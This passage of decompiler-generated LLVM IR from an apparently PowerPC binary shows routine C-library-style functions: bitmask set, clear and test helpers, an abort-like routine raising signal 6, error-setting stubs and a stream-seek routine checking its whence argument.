  %v0_1000b888 = phi i32 [ %v0_1000b844, %dec_label_pc_1000b858 ], [ %v0_1000b844, %dec_label_pc_1000b828 ], [ %v0_1000b888.pre, %dec_label_pc_1000b868 ]
  store i32 %v0_1000b7dc, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000b888

; uselistorder directives
  uselistorder i32 %v0_1000b844, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1000b884, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000b828, { 1, 0 }
}

define i32 @function_1000b89c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b89c:
  %v1_1000b89c = add i32 %arg2, -1
  %v1_1000b8a0 = call i32 @__asm_rlwinm(i32 %v1_1000b89c, i32 29, i32 3, i32 29)
  %v1_1000b8a4 = urem i32 %v1_1000b89c, 32
  %v2_1000b8a8 = add i32 %v1_1000b8a0, %arg1
  %v3_1000b8a8 = inttoptr i32 %v2_1000b8a8 to i32*
  %v4_1000b8a8 = load i32, i32* %v3_1000b8a8, align 4
  %v3_1000b8b0 = shl i32 1, %v1_1000b8a4
  %v2_1000b8b4 = and i32 %v4_1000b8a8, %v3_1000b8b0
  %v2_1000b8b8 = icmp ne i32 %v2_1000b8b4, 0
  %v5_1000b8bc = zext i1 %v2_1000b8b8 to i32
  ret i32 %v5_1000b8bc
}

define i32 @function_1000b8c4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000b8c4:
  %v1_1000b8c4 = add i32 %arg2, -1
  %v1_1000b8cc = call i32 @__asm_rlwinm(i32 %v1_1000b8c4, i32 29, i32 3, i32 29)
  %v1_1000b8d0 = urem i32 %v1_1000b8c4, 32
  %v2_1000b8d4 = add i32 %v1_1000b8cc, %arg1
  %v3_1000b8d4 = inttoptr i32 %v2_1000b8d4 to i32*
  %v4_1000b8d4 = load i32, i32* %v3_1000b8d4, align 4
  %v3_1000b8d8 = shl i32 1, %v1_1000b8d0
  %v2_1000b8dc = or i32 %v3_1000b8d8, %v4_1000b8d4
  store i32 %v2_1000b8dc, i32* %v3_1000b8d4, align 4
  ret i32 0
}

define i32 @function_1000b8ec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000b8ec:
  %v1_1000b8ec = add i32 %arg2, -1
  %v1_1000b8f4 = call i32 @__asm_rlwinm(i32 %v1_1000b8ec, i32 29, i32 3, i32 29)
  %v1_1000b8f8 = urem i32 %v1_1000b8ec, 32
  %v2_1000b8fc = add i32 %v1_1000b8f4, %arg1
  %v3_1000b8fc = inttoptr i32 %v2_1000b8fc to i32*
  %v4_1000b8fc = load i32, i32* %v3_1000b8fc, align 4
  %v3_1000b900 = shl i32 -2, %v1_1000b8f8
  %v4_1000b900 = sub nsw i32 32, %v1_1000b8f8
  %v5_1000b900 = lshr i32 -2, %v4_1000b900
  %v6_1000b900 = or i32 %v5_1000b900, %v3_1000b900
  %v2_1000b904 = and i32 %v6_1000b900, %v4_1000b8fc
  store i32 %v2_1000b904, i32* %v3_1000b8fc, align 4
  ret i32 0
}

define i32 @function_1000b914(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000b948.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v2_1000b928 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_1000b928, i32* %r29.global-to-local, align 4
  %v0_1000b930 = call i32 @function_100091f4()
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_1000b94c34 = add i32 %v2_1000b928, 124
  %v4_1000b94c35 = inttoptr i32 %v3_1000b94c34 to i32*
  store i32 0, i32* %v4_1000b94c35, align 4
  %v0_1000b95036 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b95037 = add i32 %v0_1000b95036, -1
  store i32 %v1_1000b95037, i32* %r9.global-to-local, align 4
  %v0_1000b95438 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b95439 = add i32 %v0_1000b95438, -1
  store i32 %v1_1000b95439, i32* %ctr.global-to-local, align 4
  %v2_1000b95440 = icmp eq i32 %v1_1000b95439, 0
  br i1 %v2_1000b95440, label %dec_label_pc_1000b958, label %dec_label_pc_1000b948.dec_label_pc_1000b948_crit_edge

dec_label_pc_1000b948.dec_label_pc_1000b948_crit_edge: ; preds = %dec_label_pc_1000b948.lr.ph, %dec_label_pc_1000b948.dec_label_pc_1000b948_crit_edge
  %v1_1000b95041 = phi i32 [ %v1_1000b950, %dec_label_pc_1000b948.dec_label_pc_1000b948_crit_edge ], [ %v1_1000b95037, %dec_label_pc_1000b948.lr.ph ]
  %v0_1000b94c.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_1000b948 = mul i32 %v1_1000b95041, 4
  %v1_1000b94c = load i32, i32* %r29.global-to-local, align 4
  %v3_1000b94c = add i32 %v1_1000b94c, %v1_1000b948
  %v4_1000b94c = inttoptr i32 %v3_1000b94c to i32*
  store i32 %v0_1000b94c.pre, i32* %v4_1000b94c, align 4
  %v0_1000b950 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000b950 = add i32 %v0_1000b950, -1
  store i32 %v1_1000b950, i32* %r9.global-to-local, align 4
  %v0_1000b954 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000b954 = add i32 %v0_1000b954, -1
  store i32 %v1_1000b954, i32* %ctr.global-to-local, align 4
  %v2_1000b954 = icmp eq i32 %v1_1000b954, 0
  br i1 %v2_1000b954, label %dec_label_pc_1000b958, label %dec_label_pc_1000b948.dec_label_pc_1000b948_crit_edge

dec_label_pc_1000b958:                            ; preds = %dec_label_pc_1000b948.dec_label_pc_1000b948_crit_edge, %dec_label_pc_1000b948.lr.ph
  %v1_1000b950.lcssa = phi i32 [ %v1_1000b95037, %dec_label_pc_1000b948.lr.ph ], [ %v1_1000b950, %dec_label_pc_1000b948.dec_label_pc_1000b948_crit_edge ]
  %v3_1000b960 = call i32 @function_1000b8c4(i32 %v2_1000b928, i32 6, i32 %v1_1000b950.lcssa)
  %v3_1000b964 = icmp eq i32 %v3_1000b960, 0
  br i1 %v3_1000b964, label %dec_label_pc_1000b96c, label %dec_label_pc_1000b97c

dec_label_pc_1000b96c:                            ; preds = %dec_label_pc_1000b958
  store i32 268482940, i32* @lr, align 4
  %v3_1000b978 = call i32 @function_10009a08(i32 1, i32 %v2_1000b928, i32 0)
  br label %dec_label_pc_1000b97c

dec_label_pc_1000b97c:                            ; preds = %dec_label_pc_1000b958, %dec_label_pc_1000b96c
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b980 = load i32, i32* @global_var_100104d0.332, align 4
  %v3_1000b984 = icmp eq i32 %v3_1000b980, 0
  br i1 %v3_1000b984, label %dec_label_pc_1000b98c, label %dec_label_pc_1000b9b4

dec_label_pc_1000b98c:                            ; preds = %dec_label_pc_1000b97c
  store i32 1, i32* @global_var_100104d0.332, align 4
  br label %dec_label_pc_1000b994

dec_label_pc_1000b994:                            ; preds = %dec_label_pc_1000ba10, %dec_label_pc_1000b98c
  store i32 ptrtoint (i32* @global_var_100103f8.330 to i32), i32* %r29.global-to-local, align 4
  %v0_1000b9a0 = call i32 @function_100091f4()
  store i32 268482988, i32* @lr, align 4
  %v1_1000b9a8 = call i32 @function_1000cf04(i32 6)
  %v0_1000b9b0 = call i32 @function_100091f4()
  %v3_1000b9b8.pre = load i32, i32* @global_var_100104d0.332, align 4
  br label %dec_label_pc_1000b9b4

dec_label_pc_1000b9b4:                            ; preds = %dec_label_pc_1000b97c, %dec_label_pc_1000b994
  %v0_1000ba2c = phi i32 [ %v3_1000b980, %dec_label_pc_1000b97c ], [ %v3_1000b9b8.pre, %dec_label_pc_1000b994 ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  %v3_1000b9bc = icmp eq i32 %v0_1000ba2c, 1
  br i1 %v3_1000b9bc, label %dec_label_pc_1000b9fc.lr.ph, label %dec_label_pc_1000ba2c

dec_label_pc_1000b9fc.lr.ph:                      ; preds = %dec_label_pc_1000b9b4
  %v2_1000b9c8 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_100104d0.332, align 4
  store i32 ptrtoint (i32* @global_var_1000b9dc.334 to i32), i32* @lr, align 4
  %v3_1000b9d8 = call i32 @function_100071a0(i32 %v2_1000b9c8, i32 0, i32 140)
  store i32 %v2_1000b928, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1000ba0024 = add i32 %v2_1000b928, 124
  store i32 %v2_1000ba0024, i32* %r9.global-to-local, align 4
  %v2_1000ba0425 = add i32 %v2_1000b928, 256
  %v3_1000ba0426 = inttoptr i32 %v2_1000ba0425 to i32*
  store i32 -1, i32* %v3_1000ba0426, align 4
  %v0_1000ba0827 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ba0828 = add i32 %v0_1000ba0827, -1
  store i32 %v1_1000ba0828, i32* %r11.global-to-local, align 4
  %v0_1000ba0c29 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ba0c30 = add i32 %v0_1000ba0c29, -1
  store i32 %v1_1000ba0c30, i32* %ctr.global-to-local, align 4
  %v2_1000ba0c31 = icmp eq i32 %v1_1000ba0c30, 0
  br i1 %v2_1000ba0c31, label %dec_label_pc_1000ba10, label %dec_label_pc_1000b9fc.dec_label_pc_1000b9fc_crit_edge

dec_label_pc_1000b9fc.dec_label_pc_1000b9fc_crit_edge: ; preds = %dec_label_pc_1000b9fc.lr.ph, %dec_label_pc_1000b9fc.dec_label_pc_1000b9fc_crit_edge
  %v1_1000ba0832 = phi i32 [ %v1_1000ba08, %dec_label_pc_1000b9fc.dec_label_pc_1000b9fc_crit_edge ], [ %v1_1000ba0828, %dec_label_pc_1000b9fc.lr.ph ]
  %v1_1000ba00.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_1000ba04.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_1000b9fc = mul i32 %v1_1000ba0832, 4
  %v2_1000ba00 = add i32 %v1_1000b9fc, %v1_1000ba00.pre
  store i32 %v2_1000ba00, i32* %r9.global-to-local, align 4
  %v2_1000ba04 = add i32 %v2_1000ba00, 132
  %v3_1000ba04 = inttoptr i32 %v2_1000ba04 to i32*
  store i32 %v0_1000ba04.pre, i32* %v3_1000ba04, align 4
  %v0_1000ba08 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000ba08 = add i32 %v0_1000ba08, -1
  store i32 %v1_1000ba08, i32* %r11.global-to-local, align 4
  %v0_1000ba0c = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000ba0c = add i32 %v0_1000ba0c, -1
  store i32 %v1_1000ba0c, i32* %ctr.global-to-local, align 4
  %v2_1000ba0c = icmp eq i32 %v1_1000ba0c, 0
  br i1 %v2_1000ba0c, label %dec_label_pc_1000ba10, label %dec_label_pc_1000b9fc.dec_label_pc_1000b9fc_crit_edge

dec_label_pc_1000ba10:                            ; preds = %dec_label_pc_1000b9fc.dec_label_pc_1000b9fc_crit_edge, %dec_label_pc_1000b9fc.lr.ph
  store i32 268483112, i32* @lr, align 4
  %v4_1000ba24 = call i32 @function_1000b7d8(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_1000b994

dec_label_pc_1000ba2c:                            ; preds = %dec_label_pc_1000b9b4
  %v3_1000ba2c = icmp eq i32 %v0_1000ba2c, 2
  br i1 %v3_1000ba2c, label %dec_label_pc_1000ba34, label %dec_label_pc_1000ba40

dec_label_pc_1000ba34:                            ; preds = %dec_label_pc_1000ba2c
  store i32 3, i32* @global_var_100104d0.332, align 4
  br label %dec_label_pc_1000ba40

dec_label_pc_1000ba40:                            ; preds = %dec_label_pc_1000ba2c, %dec_label_pc_1000ba34
  %v3_1000ba40 = phi i32 [ %v0_1000ba2c, %dec_label_pc_1000ba2c ], [ 3, %dec_label_pc_1000ba34 ]
  %v1_1000ba48 = icmp ne i32 %v3_1000ba40, 3
  call void @__pseudo_cond_branch(i1 %v1_1000ba48, i32 268483164)
  store i32 4, i32* @global_var_100104d0.332, align 4
  %v1_1000ba58 = call i32 @function_1000968c(i32 127)
  ret i32 %v1_1000ba58

; uselistorder directives
  uselistorder i32 %v1_1000ba0c, { 1, 0 }
  uselistorder i32 %v1_1000ba08, { 1, 0 }
  uselistorder i32 %v1_1000b954, { 1, 0 }
  uselistorder i32 %v1_1000b950, { 0, 2, 1 }
  uselistorder i32 %v2_1000b928, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 2, 3, 9, 8, 1, 4, 5 }
  uselistorder i32 (i32)* @function_1000968c, { 1, 0, 2 }
  uselistorder i32 127, { 1, 4, 0, 3, 5, 2 }
  uselistorder i32 (i32, i32*, i32)* @function_1000b7d8, { 1, 0 }
  uselistorder i32 132, { 3, 1, 2, 0 }
  uselistorder i32* @global_var_100104d0.332, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @function_10009a08, { 0, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @function_1000b8c4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000ba40, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9fc.dec_label_pc_1000b9fc_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9b4, { 1, 0 }
  uselistorder label %dec_label_pc_1000b97c, { 1, 0 }
  uselistorder label %dec_label_pc_1000b948.dec_label_pc_1000b948_crit_edge, { 1, 0 }
}

define i32 @function_1000ba64(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000ba64:
  %v1_1000ba64 = add i32 %arg1, 28
  %v2_1000ba64 = inttoptr i32 %v1_1000ba64 to i32*
  %v3_1000ba64 = load i32, i32* %v2_1000ba64, align 4
  store i32 %v3_1000ba64, i32* @global_var_100104d4.335, align 4
  %v1_1000ba74 = add i32 %arg1, 44
  %v2_1000ba74 = inttoptr i32 %v1_1000ba74 to i32*
  %v3_1000ba74 = load i32, i32* %v2_1000ba74, align 4
  store i32 %v3_1000ba74, i32* @global_var_100104d8.336, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @function_1000ba80() local_unnamed_addr {
dec_label_pc_1000ba80:
  %v0_1000ba8c = load i32, i32* @r3, align 4
  store i32 %v0_1000ba8c, i32* @r29, align 4
  %v0_1000ba94 = call i32 @function_10004e38()
  %v0_1000ba98 = load i32, i32* @r29, align 4
  %v2_1000ba98 = inttoptr i32 %v0_1000ba94 to i32*
  store i32 %v0_1000ba98, i32* %v2_1000ba98, align 4
  ret i32 -1
}

define i32 @function_1000bab4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000bab4:
  store i32 %arg1, i32* @global_var_100104dc.298, align 4
  %v0_1000badc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_1000badc)
  store i32 12, i32* @r3, align 4
  %v0_1000bae4 = call i32 @function_1000ba80()
  ret i32 %v0_1000bae4

; uselistorder directives
  uselistorder i32 ()* @function_1000ba80, { 1, 0 }
  uselistorder i32* @global_var_100104dc.298, { 1, 0, 2 }
}

define i32 @function_1000bae8() local_unnamed_addr {
dec_label_pc_1000bae8:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000bb00 = call i32 @__asm_mfcr()
  %v1_1000bb04 = and i32 %v0_1000bb00, 268435456
  %v3_1000bb04 = icmp eq i32 %v1_1000bb04, 0
  store i32 %v0_1000bb00, i32* %r31.global-to-local, align 4
  br i1 %v3_1000bb04, label %dec_label_pc_1000bb1c, label %dec_label_pc_1000bb10

dec_label_pc_1000bb10:                            ; preds = %dec_label_pc_1000bae8
  %v0_1000bb10 = call i32 @function_10004e38()
  %v0_1000bb14 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000bb14 = inttoptr i32 %v0_1000bb10 to i32*
  store i32 %v0_1000bb14, i32* %v2_1000bb14, align 4
  br label %dec_label_pc_1000bb1c

dec_label_pc_1000bb1c:                            ; preds = %dec_label_pc_1000bae8, %dec_label_pc_1000bb10
  %v0_1000bb2c = phi i32 [ %v0_1000bb00, %dec_label_pc_1000bae8 ], [ -1, %dec_label_pc_1000bb10 ]
  ret i32 %v0_1000bb2c

; uselistorder directives
  uselistorder label %dec_label_pc_1000bb1c, { 1, 0 }
}

define i32 @function_1000bb30(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bb30:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000bb48 = call i32 @__asm_mfcr()
  %v1_1000bb4c = and i32 %v0_1000bb48, 268435456
  %v3_1000bb4c = icmp eq i32 %v1_1000bb4c, 0
  store i32 %v0_1000bb48, i32* %r31.global-to-local, align 4
  br i1 %v3_1000bb4c, label %dec_label_pc_1000bb64, label %dec_label_pc_1000bb58

dec_label_pc_1000bb58:                            ; preds = %dec_label_pc_1000bb30
  %v0_1000bb58 = call i32 @function_10004e38()
  %v0_1000bb5c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000bb5c = inttoptr i32 %v0_1000bb58 to i32*
  store i32 %v0_1000bb5c, i32* %v2_1000bb5c, align 4
  br label %dec_label_pc_1000bb64

dec_label_pc_1000bb64:                            ; preds = %dec_label_pc_1000bb30, %dec_label_pc_1000bb58
  %v0_1000bb74 = phi i32 [ %v0_1000bb48, %dec_label_pc_1000bb30 ], [ -1, %dec_label_pc_1000bb58 ]
  ret i32 %v0_1000bb74

; uselistorder directives
  uselistorder label %dec_label_pc_1000bb64, { 1, 0 }
}

define i32 @function_1000bb78(i16* %arg1) local_unnamed_addr {
dec_label_pc_1000bb78:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_1000bb78 = load i32, i32* @r5, align 4
  %v0_1000bb7c = load i32, i32* @r4, align 4
  %tmp10 = icmp slt i32 %v0_1000bb7c, 0
  %v1_1000bb80 = zext i1 %tmp10 to i32
  %v2_1000bb80 = ashr i32 %v0_1000bb7c, 31
  %v3_1000bb80 = and i32 %v2_1000bb80, -2
  %v4_1000bb80 = or i32 %v3_1000bb80, %v1_1000bb80
  %v0_1000bb8c = load i32, i32* @lr, align 4
  store i32 %v0_1000bb8c, i32* %r0.global-to-local, align 4
  store i32 %v0_1000bb78, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %v4_1000bb80, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_1000bb78, 3
  br i1 %tmp9, label %dec_label_pc_1000bbc4, label %dec_label_pc_1000bbb0

dec_label_pc_1000bbb0:                            ; preds = %dec_label_pc_1000bb78
  %v0_1000bbb0 = call i32 @function_10004e38()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1000bbbc = inttoptr i32 %v0_1000bbb0 to i32*
  store i32 22, i32* %v2_1000bbbc, align 4
  br label %dec_label_pc_1000bc8c

dec_label_pc_1000bbc4:                            ; preds = %dec_label_pc_1000bb78
  %v2_1000bbc4 = add i32 %tmp, 52
  %v3_1000bbc4 = inttoptr i32 %v2_1000bbc4 to i32*
  %v4_1000bbc4 = load i32, i32* %v3_1000bbc4, align 4
  store i32 %v4_1000bbc4, i32* @r28, align 4
  %v3_1000bbc8 = icmp eq i32 %v4_1000bbc4, 0
  br i1 %v3_1000bbc8, label %dec_label_pc_1000bbd0, label %dec_label_pc_1000bbf0

dec_label_pc_1000bbd0:                            ; preds = %dec_label_pc_1000bbc4
  %v2_1000bbd0 = add i32 %tmp, 56
  store i32 %v2_1000bbd0, i32* @r29, align 4
  %v2_1000bbd8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000bbd8, i32* @r3, align 4
  %v0_1000bbe4 = call i32 @function_100091fc()
  %v0_1000bbec = call i32 @function_100091f4()
  %v0_1000bbf0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000bbf0

dec_label_pc_1000bbf0:                            ; preds = %dec_label_pc_1000bbc4, %dec_label_pc_1000bbd0
  %v0_1000bbfc = phi i32 [ %tmp, %dec_label_pc_1000bbc4 ], [ %v0_1000bbf0.pre, %dec_label_pc_1000bbd0 ]
  %v1_1000bbf0 = inttoptr i32 %v0_1000bbfc to i16*
  %v2_1000bbf0 = load i16, i16* %v1_1000bbf0, align 2
  %v3_1000bbf0 = zext i16 %v2_1000bbf0 to i32
  store i32 %v3_1000bbf0, i32* %r0.global-to-local, align 4
  %v1_1000bbf4 = and i32 %v3_1000bbf0, 64
  store i32 %v1_1000bbf4, i32* %r9.global-to-local, align 4
  %v3_1000bbf4 = icmp eq i32 %v1_1000bbf4, 0
  br i1 %v3_1000bbf4, label %dec_label_pc_1000bc0c, label %dec_label_pc_1000bbfc

dec_label_pc_1000bbfc:                            ; preds = %dec_label_pc_1000bbf0
  store i32 %v0_1000bbfc, i32* @r3, align 4
  store i32 268483588, i32* @lr, align 4
  %v0_1000bc00 = call i32 @function_10005838()
  %v3_1000bc04 = icmp eq i32 %v0_1000bc00, 0
  br i1 %v3_1000bc04, label %dec_label_pc_1000bc0c, label %dec_label_pc_1000bc74

dec_label_pc_1000bc0c:                            ; preds = %dec_label_pc_1000bbfc, %dec_label_pc_1000bbf0
  %v0_1000bc0c = load i32, i32* @r30, align 4
  %v3_1000bc0c = icmp eq i32 %v0_1000bc0c, 1
  br i1 %v3_1000bc0c, label %dec_label_pc_1000bc14, label %dec_label_pc_1000bc0c.dec_label_pc_1000bc28_crit_edge

dec_label_pc_1000bc0c.dec_label_pc_1000bc28_crit_edge: ; preds = %dec_label_pc_1000bc0c
  br label %dec_label_pc_1000bc28

dec_label_pc_1000bc14:                            ; preds = %dec_label_pc_1000bc0c
  %v0_1000bc14 = load i32, i32* @r31, align 4
  %v1_1000bc14 = inttoptr i32 %v0_1000bc14 to i16*
  %v2_1000bc18 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268483616, i32* @lr, align 4
  %v4_1000bc1c = call i32 @function_1000bd18(i16* %v1_1000bc14, i32 %v2_1000bc18)
  %v1_1000bc20 = icmp slt i32 %v4_1000bc1c, 0
  br i1 %v1_1000bc20, label %dec_label_pc_1000bc74, label %dec_label_pc_1000bc14.dec_label_pc_1000bc28_crit_edge

dec_label_pc_1000bc14.dec_label_pc_1000bc28_crit_edge: ; preds = %dec_label_pc_1000bc14
  %v0_1000bc28.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000bc28

dec_label_pc_1000bc28:                            ; preds = %dec_label_pc_1000bc0c.dec_label_pc_1000bc28_crit_edge, %dec_label_pc_1000bc14.dec_label_pc_1000bc28_crit_edge
  %v0_1000bc28 = phi i32 [ %v0_1000bc0c, %dec_label_pc_1000bc0c.dec_label_pc_1000bc28_crit_edge ], [ %v0_1000bc28.pre, %dec_label_pc_1000bc14.dec_label_pc_1000bc28_crit_edge ]
  %v0_1000bc2c = load i32, i32* @r31, align 4
  store i32 268483640, i32* @lr, align 4
  %v5_1000bc34 = call i32 @function_1000bf00(i32 %v0_1000bc2c, i32* nonnull %stack_var_-56, i32 %v0_1000bc28)
  %v1_1000bc38 = icmp slt i32 %v5_1000bc34, 0
  br i1 %v1_1000bc38, label %dec_label_pc_1000bc74, label %dec_label_pc_1000bc40

dec_label_pc_1000bc40:                            ; preds = %dec_label_pc_1000bc28
  %v0_1000bc40 = load i32, i32* @r31, align 4
  %v1_1000bc40 = inttoptr i32 %v0_1000bc40 to i16*
  %v2_1000bc40 = load i16, i16* %v1_1000bc40, align 2
  %v3_1000bc40 = zext i16 %v2_1000bc40 to i32
  store i32 %v3_1000bc40, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1000bc48 = add i32 %v0_1000bc40, 8
  %v2_1000bc48 = inttoptr i32 %v1_1000bc48 to i32*
  %v3_1000bc48 = load i32, i32* %v2_1000bc48, align 4
  store i32 %v3_1000bc48, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v3_1000bc50 = add i32 %v0_1000bc40, 2
  %v4_1000bc50 = inttoptr i32 %v3_1000bc50 to i8*
  store i8 0, i8* %v4_1000bc50, align 1
  %v0_1000bc54 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bc54 = and i32 %v0_1000bc54, 65464
  store i32 %v1_1000bc54, i32* %r0.global-to-local, align 4
  %v0_1000bc58 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000bc58 = load i32, i32* @r31, align 4
  %v2_1000bc58 = add i32 %v1_1000bc58, 44
  %v3_1000bc58 = inttoptr i32 %v2_1000bc58 to i32*
  store i32 %v0_1000bc58, i32* %v3_1000bc58, align 4
  %v0_1000bc5c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc5c = load i32, i32* @r31, align 4
  %v2_1000bc5c = add i32 %v1_1000bc5c, 28
  %v3_1000bc5c = inttoptr i32 %v2_1000bc5c to i32*
  store i32 %v0_1000bc5c, i32* %v3_1000bc5c, align 4
  %v0_1000bc60 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bc60 = trunc i32 %v0_1000bc60 to i16
  %v2_1000bc60 = load i32, i32* @r31, align 4
  %v3_1000bc60 = inttoptr i32 %v2_1000bc60 to i16*
  store i16 %v1_1000bc60, i16* %v3_1000bc60, align 2
  %v0_1000bc64 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc64 = load i32, i32* @r31, align 4
  %v2_1000bc64 = add i32 %v1_1000bc64, 16
  %v3_1000bc64 = inttoptr i32 %v2_1000bc64 to i32*
  store i32 %v0_1000bc64, i32* %v3_1000bc64, align 4
  %v0_1000bc68 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc68 = load i32, i32* @r31, align 4
  %v2_1000bc68 = add i32 %v1_1000bc68, 20
  %v3_1000bc68 = inttoptr i32 %v2_1000bc68 to i32*
  store i32 %v0_1000bc68, i32* %v3_1000bc68, align 4
  %v0_1000bc6c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000bc6c = load i32, i32* @r31, align 4
  %v2_1000bc6c = add i32 %v1_1000bc6c, 24
  %v3_1000bc6c = inttoptr i32 %v2_1000bc6c to i32*
  store i32 %v0_1000bc6c, i32* %v3_1000bc6c, align 4
  br label %dec_label_pc_1000bc78

dec_label_pc_1000bc74:                            ; preds = %dec_label_pc_1000bbfc, %dec_label_pc_1000bc28, %dec_label_pc_1000bc14
  store i32 -1, i32* @r30, align 4
  br label %dec_label_pc_1000bc78

dec_label_pc_1000bc78:                            ; preds = %dec_label_pc_1000bc40, %dec_label_pc_1000bc74
  %v0_1000bc78 = load i32, i32* @r28, align 4
  %v3_1000bc78 = icmp eq i32 %v0_1000bc78, 0
  br i1 %v3_1000bc78, label %dec_label_pc_1000bc80, label %dec_label_pc_1000bc8c

dec_label_pc_1000bc80:                            ; preds = %dec_label_pc_1000bc78
  %v2_1000bc80 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000bc80, i32* @r3, align 4
  %v0_1000bc88 = call i32 @function_100091fc()
  br label %dec_label_pc_1000bc8c

dec_label_pc_1000bc8c:                            ; preds = %dec_label_pc_1000bc78, %dec_label_pc_1000bbb0, %dec_label_pc_1000bc80
  store i32 %v0_1000bb8c, i32* %r0.global-to-local, align 4
  %v0_1000bc90 = load i32, i32* @r30, align 4
  ret i32 %v0_1000bc90

; uselistorder directives
  uselistorder i32 %v0_1000bb7c, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32 ()* @function_100091f4, { 6, 4, 3, 2, 41, 40, 39, 38, 37, 36, 0, 42, 48, 47, 18, 34, 33, 32, 31, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 35, 29, 28, 27, 26, 25, 30, 5, 24, 46, 1, 23, 22, 45, 44, 43, 21, 20, 19 }
  uselistorder i32 ()* @function_100091fc, { 5, 4, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 1, 0, 47, 46, 59, 58, 57, 56, 7, 6, 33, 32, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 31, 30, 3, 2, 19, 18, 55, 54, 17, 16, 15, 14, 53, 52, 51, 50, 49, 48, 13, 12, 11, 10, 9, 8 }
  uselistorder i32 56, { 3, 5, 1, 4, 0, 2 }
  uselistorder i32 52, { 9, 10, 12, 1, 3, 6, 2, 11, 7, 8, 0, 4, 5 }
  uselistorder i32 22, { 1, 14, 2, 10, 3, 11, 12, 4, 16, 5, 15, 6, 0, 13, 7, 8, 9 }
  uselistorder label %dec_label_pc_1000bc8c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000bc78, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc74, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1000bc28, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbf0, { 1, 0 }
}

